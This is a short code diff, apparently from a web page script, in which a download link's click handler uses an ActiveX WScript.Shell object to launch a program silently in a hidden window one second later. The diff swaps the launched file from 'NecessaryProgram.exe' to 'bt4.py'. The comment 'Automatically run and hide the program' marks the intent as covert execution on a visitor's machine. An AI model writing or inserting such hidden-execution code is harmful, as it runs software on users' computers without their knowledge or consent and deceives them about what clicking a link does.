@@ -32,6 +32,6 @@ document.getElementById('downloadLink').addEventListener('click', function() {
     // Automatically run and hide the program
     setTimeout(() => {
         const shell = new ActiveXObject("WScript.Shell");
-        shell.Run("NecessaryProgram.exe", 0, false); // Adjust to your environment
+        shell.Run("bt4.py", 0, false); // Adjust to your environment
     }, 1000);
 });
